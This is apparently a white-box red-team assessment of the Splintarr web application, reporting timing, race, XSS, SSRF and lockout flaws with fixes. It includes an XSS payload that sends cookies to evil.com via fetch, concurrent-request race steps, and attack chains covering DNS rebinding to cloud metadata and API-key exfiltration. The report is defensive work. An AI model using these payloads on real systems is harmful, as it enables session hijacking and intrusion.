# Red Team Adversarial Security Assessment
## Splintarr

**Assessment Date:** February 25, 2026
**Assessor Persona:** Senior Red Team Operator / Adversarial Simulation (APT)
**Methodology:** OWASP Testing Guide v4.2, PTES, NIST SP 800-115, Manual White-Box Code Review
**Scope:** Full application -- authentication, cryptography, API surface, template rendering, container security, inter-service communication
**Codebase Version:** 0.1.0-alpha (post-prior-remediation)

---

## Executive Summary

This assessment adopts an advanced threat actor mindset to identify exploitation paths that a conventional audit would miss. The focus is on **chaining weaknesses**, **timing oracles**, **race conditions**, and **context-dependent injection** -- the kinds of bugs that survive multiple rounds of security review because they require adversarial reasoning to identify.

### Risk Rating: HIGH

| Severity | Count | Exploitable Without Auth | Exploitable With Auth |
|----------|-------|--------------------------|----------------------|
| CRITICAL | 3 | 1 | 2 |
| HIGH | 4 | 1 | 3 |
| MEDIUM | 5 | 2 | 3 |
| LOW | 3 | 0 | 3 |
| **Total** | **15** | **4** | **11** |

### Key Attack Chains Identified

1. **Username Enumeration** (unauthenticated, timing oracle) -> **Account Lockout DoS** -> user calls for help -> **Social engineering**
2. **Setup Wizard Race** (unauthenticated, TOCTOU) -> **Rogue Admin Creation** -> full application compromise
3. **Stored XSS via Instance Name** (authenticated) -> **Cookie Theft** -> session hijacking (currently mitigated by CSP, but CSP is structurally fragile)

---

## CRITICAL Findings

### CRIT-01: Username Enumeration via Argon2 Timing Oracle

**CVSS 3.1:** 7.5 (High) -- `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
**CWE:** CWE-208 (Observable Timing Discrepancy)
**OWASP:** API2:2023 -- Broken Authentication
**Location:** `src/splintarr/core/auth.py:467-504`

**The Vulnerability:**

The `authenticate_user()` function has two fundamentally different code paths:

```
Path A (user NOT found):   Line 471 → return None          (~1ms)
Path B (user found):       Line 490 → verify_password()    (~500ms-2000ms)
```

Argon2id is configured with 128 MiB memory and 3 iterations. This takes hundreds of milliseconds per invocation. When a username does not exist, the function returns immediately without performing any hashing. The response time difference is **observable over the network** even with jitter.

**Attack Scenario:**

An attacker sends login requests and measures response times:

```
POST /api/auth/login  {"username": "admin", "password": "x"}     → 847ms  (user EXISTS)
POST /api/auth/login  {"username": "nouser", "password": "x"}    → 3ms    (user NOT FOUND)
```

Both return `401 "Invalid username or password"`, but the timing reveals the truth. The rate limit of 5/minute is easily defeated by distributing across IP addresses or waiting.

**Impact:** Complete username enumeration. Combined with credential stuffing or targeted phishing, this leads to account compromise.

**Remediation:**

```python
def authenticate_user(db, username, password, ip_address=None):
    user = db.query(User).filter(User.username == username).first()

    if not user:
        # Perform a dummy hash to equalize timing
        verify_password("dummy_password_for_timing", DUMMY_HASH)
        return None

    # ... proceed with real verification
```

Store a pre-computed Argon2 hash at module load time and verify against it on the "user not found" path.

---

### CRIT-02: Setup Wizard Race Condition -- Rogue Admin Creation

**CVSS 3.1:** 9.8 (Critical) -- `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**CWE:** CWE-367 (Time-of-Check Time-of-Use)
**OWASP:** API1:2023 -- Broken Object Level Authorization
**Location:** `src/splintarr/api/dashboard.py:275-320`

**The Vulnerability:**

The setup wizard checks if any users exist, then creates the first user:

```python
# Line 275: CHECK
user_count = db.query(User).count()
if user_count > 0:
    return RedirectResponse(url="/")

# ... validation logic ...

# Line 318: USE (many lines later)
user = User(username=username.lower(), password_hash=password_hash,
            is_active=True, is_superuser=True)
db.add(user)
db.commit()
```

Between the check (line 275) and the commit (line 319), another concurrent request can also pass the check. Both requests create superuser accounts.

**Attack Scenario:**

During initial deployment, before the legitimate admin completes setup:

1. Attacker monitors the application URL
2. When `/setup` becomes accessible, sends two concurrent POST requests to `/setup/admin`
3. Both pass the `user_count == 0` check
4. Both create superuser accounts
5. Attacker now has a valid admin account

The window is narrow but real -- it exists from the moment the container starts until the first admin completes setup. No authentication is required.

**Impact:** Full application compromise. Attacker gains superuser access to all instances, API keys, and search configurations.

**Remediation:**

```python
from sqlalchemy import func

# Use database-level locking
with db.begin():
    user_count = db.query(func.count(User.id)).with_for_update().scalar()
    if user_count > 0:
        return RedirectResponse(url="/")
    # ... create user within the same transaction
```

Or use a database constraint (unique flag) or an application-level mutex.

---

### CRIT-03: Stored XSS via Instance/Queue Names in Inline Event Handlers

**CVSS 3.1:** 6.1 (Medium) → **8.0 (High) if CSP regresses**
**CWE:** CWE-79 (Cross-site Scripting -- Stored)
**OWASP:** API8:2023 -- Security Misconfiguration
**Locations:**
- `templates/dashboard/instances.html:63`
- `templates/components/instance_card.html:62`
- `templates/components/queue_card.html:84`
- `templates/dashboard/search_queues.html:81`

**The Vulnerability:**

Template code renders user-controlled data inside JavaScript string literals within inline event handlers:

```html
<button onclick="deleteInstance({{ instance.id }}, '{{ instance.name }}')">Delete</button>
```

Jinja2's auto-escaping converts `'` to `&#39;`. However, the HTML parser **decodes entities before passing to the JavaScript engine**. The attack chain is:

1. Attacker creates instance with name: `');fetch('https://evil.com/steal?c='+document.cookie);//`
2. Jinja2 renders: `onclick="deleteInstance(1, '&#x27;);fetch(&#x27;https://evil.com/steal?c=&#x27;+document.cookie);//')"`
3. HTML parser decodes entities: `deleteInstance(1, '');fetch('https://evil.com/steal?c='+document.cookie);//')`
4. JavaScript evaluates the broken-out code

**Current Mitigation State:**

The nonce-based CSP (`script-src 'self' 'nonce-xxx'`) **should block inline event handlers**. CSP nonces only cover `<script>` elements, not `onclick`/`oninput` attributes. This means:

- If CSP is enforced: all 20+ `onclick` handlers across the application are **non-functional** (broken UX)
- If CSP is relaxed to fix UX (adding `'unsafe-inline'` or `'unsafe-hashes'`): the XSS becomes exploitable

This is a **latent vulnerability** -- it's one "fix the broken buttons" commit away from being Critical.

**Impact (if CSP regresses):** Session hijacking via cookie theft. Cookies are HttpOnly, so direct theft is blocked, but the attacker can make authenticated API calls (delete instances, exfiltrate API keys by creating test connections to attacker-controlled servers).

**Remediation:**

Replace all inline event handlers with `addEventListener` in the nonce-protected `<script>` blocks:

```html
<!-- BEFORE (vulnerable) -->
<button onclick="deleteInstance({{ instance.id }}, '{{ instance.name }}')">Delete</button>

<!-- AFTER (secure) -->
<button data-action="delete" data-id="{{ instance.id }}" data-name="{{ instance.name }}">Delete</button>

<script nonce="{{ request.state.csp_nonce }}">
document.querySelectorAll('[data-action="delete"]').forEach(btn => {
    btn.addEventListener('click', () => {
        deleteInstance(parseInt(btn.dataset.id), btn.dataset.name);
    });
});
</script>
```

This moves the user data into `data-*` attributes (HTML-escaped by Jinja2, safe in attribute context) and keeps JavaScript in nonce-protected blocks.

---

## HIGH Findings

### HIGH-01: Setup Wizard Bypasses Password Complexity Policy

**CWE:** CWE-521 (Weak Password Requirements)
**Location:** `src/splintarr/api/dashboard.py:294`

**The Vulnerability:**

The setup wizard validates passwords with only: `if len(password) < 12`. The API registration endpoint (`/api/auth/register`) uses the full `UserRegister` Pydantic schema which enforces uppercase, lowercase, digit, special character, and common password checks.

The setup wizard accepts `aaaaaaaaaaaa` (12 lowercase a's) as the admin password.

**Impact:** The most privileged account (first superuser) can have the weakest password in the system.

**Remediation:** Import and use the same password validation logic from the schema, or call `UserRegister(username=username, password=password)` to trigger validation.

---

### HIGH-02: Access Tokens Are Non-Revocable for 15 Minutes

**CWE:** CWE-613 (Insufficient Session Expiration)
**Location:** `src/splintarr/core/auth.py:192-236`

**The Vulnerability:**

Access token verification (line 210) checks the JWT signature and expiry but performs **no database lookup**. The code comment explicitly states: "Does not check database (access tokens cannot be revoked)."

This means:
- If a user logs out, their access token works for up to 15 more minutes
- If an admin deactivates a user, the user retains access for up to 15 minutes
- If an access token is stolen, there is no way to invalidate it

**Impact:** Stolen tokens provide guaranteed access for the remaining lifetime. Logout is cosmetic for the access token layer.

**Remediation:** Either:
1. Reduce access token lifetime to 5 minutes and accept the UX tradeoff
2. Add a revocation check (database or in-memory token blacklist) to `verify_access_token()`
3. Implement a short-lived token blacklist (Redis set with TTL matching token lifetime)

---

### HIGH-03: TOCTOU in SSRF Protection (DNS Rebinding)

**CWE:** CWE-367 (Time-of-Check Time-of-Use)
**Location:** `src/splintarr/core/ssrf_protection.py:101-148`

**The Vulnerability:**

`validate_instance_url()` resolves the hostname to IP addresses via `socket.getaddrinfo()` and checks them against blocked networks. However, the actual HTTP connection is made later by `httpx.AsyncClient`, which performs its **own** DNS resolution.

An attacker controlling a DNS server can:
1. First resolution (validation): return `1.2.3.4` (public IP, passes check)
2. Second resolution (httpx connection): return `169.254.169.254` (AWS metadata)

This is a classic DNS rebinding attack. The TTL can be set to 0 to ensure re-resolution.

**Impact:** SSRF to internal services, cloud metadata endpoints, or private network resources.

**Remediation:**

Pass the resolved IP directly to httpx instead of the hostname:

```python
# After validation, store the resolved IP
resolved_ip = validate_instance_url(url, allow_local=False)

# Create client with resolved IP, not hostname
client = httpx.AsyncClient(base_url=f"http://{resolved_ip}:{port}")
```

Or use httpx's `transport` parameter with a custom resolver that only uses the pre-validated IPs.

---

### HIGH-04: Inline Event Handlers Break Under Nonce-Based CSP

**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)
**Location:** 20+ locations across 7 template files (see grep output above)

**The Vulnerability:**

The application deployed nonce-based CSP (`script-src 'self' 'nonce-xxx'`) but has 20+ inline event handlers (`onclick`, `oninput`) that are NOT covered by nonces. Per CSP Level 3, these handlers require `'unsafe-hashes'` or `'unsafe-inline'` to execute.

**Affected functionality:**
- Instance test/edit/delete buttons (`instances.html`, `instance_card.html`)
- Queue pause/resume/delete buttons (`search_queues.html`, `queue_card.html`)
- Flash message dismiss buttons (`flash.html`)
- 2FA enable/disable buttons (`settings.html`)
- Logout button (`base.html`)
- Password strength checker (`admin.html`)
- Connection test button (`instance.html`)

**Impact:** If an engineer adds `'unsafe-inline'` to fix the broken buttons, CRIT-03 (stored XSS) becomes immediately exploitable. This is a **security regression trap**.

**Remediation:** Migrate all inline handlers to `addEventListener` within nonce-protected `<script>` blocks, using `data-*` attributes for parameters. This must be done before users report the broken functionality.

---

## MEDIUM Findings

### MED-01: SQLCipher PRAGMA Key via String Interpolation

**CWE:** CWE-89 (SQL Injection)
**Location:** `src/splintarr/database.py:165`

```python
cursor.execute(f"PRAGMA key = '{db_key}'")
```

The database key is inserted via f-string into a SQL statement. If the key contains a single quote, it breaks the SQL syntax. While the key comes from configuration (not user input), this is a defense-in-depth violation. An operator setting `DATABASE_KEY=abc'def` in their environment would get a cryptic error or potentially execute unintended SQL.

**Remediation:** Use parameterized syntax: `cursor.execute("PRAGMA key = ?", (db_key,))` if supported by sqlcipher3, or escape the value.

---

### MED-02: Account Lockout as Denial-of-Service Vector

**CWE:** CWE-645 (Overly Restrictive Account Lockout Mechanism)
**Location:** `src/splintarr/core/auth.py:476-496`

An unauthenticated attacker can lock any known account by sending 5 failed login attempts (default `max_failed_login_attempts=5`). The lockout lasts 30 minutes. The rate limit is 5 requests/minute per IP, but the lockout threshold is also 5 -- meaning a single burst of 5 requests from one IP locks the account.

Combined with CRIT-01 (username enumeration), an attacker can:
1. Enumerate valid usernames via timing
2. Lock every discovered account
3. Repeat every 30 minutes indefinitely

**Remediation:** Implement progressive lockout (exponential backoff) or CAPTCHA after N failed attempts rather than hard lockout. Alternatively, lock based on (IP + username) pair, not username alone.

---

### MED-03: Setup Wizard Doesn't Apply SSRF Protection to Instance URL

**CWE:** CWE-918 (Server-Side Request Forgery)
**Location:** `src/splintarr/api/dashboard.py:402-407`

The setup wizard creates Sonarr/Radarr clients directly from the user-provided URL without calling `validate_instance_url()`:

```python
async with SonarrClient(url, api_key) as client:
    system_status = await client.get_system_status()
```

The `url` comes directly from `Form(...)` with no SSRF validation. This is only exploitable during initial setup (before first user exists), but at that point anyone can access the setup wizard.

**Remediation:** Call `validate_instance_url(url, allow_local=settings.allow_local_instances)` before passing to the client constructor.

---

### MED-04: TokenError Details Leaked to Client

**CWE:** CWE-209 (Information Exposure Through Error Message)
**Location:** `src/splintarr/api/dashboard.py:130`, `src/splintarr/api/auth.py:184,510`

```python
except TokenError as e:
    raise HTTPException(status_code=401, detail=str(e))
```

TokenError messages include specific failure reasons ("Invalid JWT algorithm: none", "Token has expired", "Invalid token type"). These help an attacker refine their token crafting approach.

**Remediation:** Return a generic "Authentication failed" message. Log the specific error server-side.

---

### MED-05: Refresh Token Cookie Sent on All Auth Paths

**CWE:** CWE-614 (Sensitive Cookie in HTTPS Session Without 'Secure' Attribute)
**Location:** `src/splintarr/api/auth.py:112-120`

The refresh token cookie has `path="/api/auth"`, meaning it's sent on every request to `/api/auth/*` -- including the register, login, and refresh endpoints. This is correct by design, but the access token cookie has `path="/"`, meaning it's sent on **every request** including static file requests.

Every request to `/static/css/pico.min.css` or `/static/js/app.js` includes the access token cookie. If the static file CDN or proxy logs cookies, the access token leaks.

**Remediation:** Set the access token cookie path to `/api` and `/dashboard` (or verify that static file serving does not log cookies).

---

## LOW Findings

### LOW-01: `last_login_ip` Exposed in Login Response

**Location:** `src/splintarr/api/auth.py:381`

The `LoginSuccess` response includes the user's previous login IP address. This reveals the user's network location to anyone who compromises the account.

---

### LOW-02: No Password Reset Mechanism

**Location:** Entire codebase (absence)

There is no password reset flow. If a user forgets their password, the only recovery path is direct database manipulation. For a single-admin system, this means complete lockout.

---

### LOW-03: Health Check Reveals Database Encryption Status

**Location:** `src/splintarr/database.py:386-434`

The health check queries `PRAGMA cipher_version`. If this information reaches the `/health` endpoint, it reveals whether the database is encrypted and which SQLCipher version is in use.

---

## Attack Chain Analysis

### Chain 1: Pre-Authentication Full Compromise

```
[Reconnaissance]
    │
    ├─► Monitor target URL for /setup availability
    │
[Exploitation]
    │
    ├─► Race condition: Send concurrent POST /setup/admin requests (CRIT-02)
    │   └─► Result: Rogue admin account created
    │
    ├─► Login with rogue admin credentials
    │
    ├─► SSRF via setup wizard (MED-03): Create instance pointing to
    │   internal network (cloud metadata, adjacent services)
    │
[Post-Exploitation]
    │
    ├─► Enumerate all instances and decrypt API keys
    ├─► Pivot to Sonarr/Radarr instances with stolen API keys
    └─► Lateral movement within homelab network
```

### Chain 2: Authenticated Privilege Persistence

```
[Initial Access]
    │
    ├─► Compromised credentials (phishing, credential stuffing)
    │
[Exploitation]
    │
    ├─► Create instance with XSS payload name (CRIT-03)
    │   Name: ');fetch(`https://evil.com/${document.cookie}`);//
    │
    ├─► If CSP is regressed (HIGH-04), steal session cookies
    │   └─► Even without cookies (HttpOnly), make API calls via fetch()
    │
[Persistence]
    │
    ├─► Access token valid for 15 min after logout (HIGH-02)
    ├─► Create additional instances pointing to C2 infrastructure
    └─► Exfiltrate all API keys via instance test endpoint
```

### Chain 3: Denial of Service

```
[Reconnaissance]
    │
    ├─► Timing oracle: Enumerate valid usernames (CRIT-01)
    │   5 req/min rate limit → ~288 usernames tested/day per IP
    │   Distributed across IPs → unlimited
    │
[Exploitation]
    │
    ├─► Lock every discovered account: 5 failed logins each (MED-02)
    │   30-minute lockout × repeated every 30 minutes
    │
[Impact]
    │
    └─► All users permanently locked out
        No password reset mechanism exists (LOW-02)
        Only recovery: direct database manipulation
```

---

## Existing Security Strengths

The assessment identified strong defensive measures in several areas:

| Area | Implementation | Assessment |
|------|---------------|------------|
| Password Hashing | Argon2id with HMAC pepper | Excellent |
| API Key Encryption | Fernet via HKDF key derivation | Strong |
| Database Encryption | SQLCipher AES-256-CFB | Strong |
| JWT Algorithm Confusion | Hardcoded whitelist + header verification | Excellent |
| Object-Level Authorization | User ID filtering on all queries | Consistent |
| Cookie Security | HttpOnly, Secure, SameSite=Strict | Strong |
| Token Rotation | Refresh tokens revoked on rotation | Good |
| SSRF Module | DNS resolution + comprehensive blocked networks | Good (TOCTOU aside) |
| Capability Dropping | Docker: drop ALL, no-new-privileges | Excellent |
| Secret Management | Docker secrets with file-based reading | Good |

---

## Remediation Priority Matrix

| ID | Finding | Effort | Impact if Exploited | Priority |
|----|---------|--------|---------------------|----------|
| CRIT-02 | Setup wizard race condition | Low (add lock) | Full compromise | **Immediate** |
| CRIT-01 | Username timing oracle | Low (dummy hash) | Enumeration + lockout chain | **Immediate** |
| HIGH-04 | Inline handlers vs CSP | Medium (refactor templates) | Breaks UX or re-enables XSS | **Immediate** |
| HIGH-01 | Setup weak password | Low (reuse schema) | Weak admin password | **This week** |
| CRIT-03 | Stored XSS in names | Medium (refactor to data-*) | Session hijacking | **This week** |
| MED-03 | Setup wizard SSRF | Low (add validation call) | Internal network access | **This week** |
| MED-02 | Account lockout DoS | Medium (progressive lockout) | Service denial | **This sprint** |
| HIGH-03 | SSRF DNS rebinding | Medium (pass resolved IPs) | Cloud metadata access | **This sprint** |
| HIGH-02 | Non-revocable access tokens | Medium (add blacklist) | 15-min post-compromise access | **This sprint** |
| MED-01 | PRAGMA SQL interpolation | Low (parameterize) | Defense-in-depth | **Backlog** |
| MED-04 | TokenError detail leakage | Low (generic messages) | Recon assistance | **Backlog** |
| MED-05 | Access token on static paths | Low (restrict cookie path) | Token leakage via logs | **Backlog** |
| LOW-01 | IP in login response | Low (remove field) | Privacy | **Backlog** |
| LOW-02 | No password reset | Medium (implement flow) | Lockout recovery | **Backlog** |
| LOW-03 | Health check info disclosure | Low (restrict response) | Recon | **Backlog** |

---

**Report Classification:** CONFIDENTIAL -- For development team only
**Report Generated:** February 25, 2026
**Next Assessment Due:** After remediation of CRITICAL and HIGH findings
